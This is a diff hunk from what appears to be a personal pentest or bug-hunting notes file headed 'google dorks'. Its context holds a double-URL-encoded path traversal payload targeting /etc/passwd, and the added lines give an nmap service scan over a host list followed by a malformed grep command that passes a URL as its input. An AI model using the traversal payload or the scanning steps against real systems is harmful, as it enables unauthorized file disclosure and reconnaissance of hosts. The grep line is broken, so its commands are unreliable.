@@ -23,8 +23,15 @@ google dorks :
 
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
   
-  
-  
+  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+  nmap -sV -iL host.txt -oN nmap_scan.txt
+
+Wait a few hours
+
+cat nmap_scan.txt | grep open http://pic.example.com
+
+
+
   
   
   
